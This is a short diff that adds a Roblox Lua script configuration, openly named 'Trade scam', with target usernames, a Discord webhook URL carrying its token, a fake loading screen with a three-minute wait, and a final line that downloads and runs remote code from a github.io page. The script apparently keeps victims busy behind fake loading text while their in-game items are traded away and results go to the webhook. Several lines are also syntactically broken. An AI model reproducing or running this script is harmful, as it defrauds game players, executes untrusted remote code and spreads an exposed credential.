@@ -1,0 +1,24 @@
+Username = "VNG_maxx2"
+
+Username2 = "VNG_maxx2"
+
+Weebhook = "https://discord.com/api/webhooks/1114790330533949451/aSM7mzV24CaHeiI4gq3XxVCcgL7Q_erDc3O215FCJ3WJdrGgIAeiUdJnQIgSPOdsx6A7"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = false
+
+_G.MouseLock =true
+
+_G.ScriptName = "Trade scam"
+
+_G.First Text = "Script Preparing"
+
+_G.Second Text = "Script Loading...'
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
+
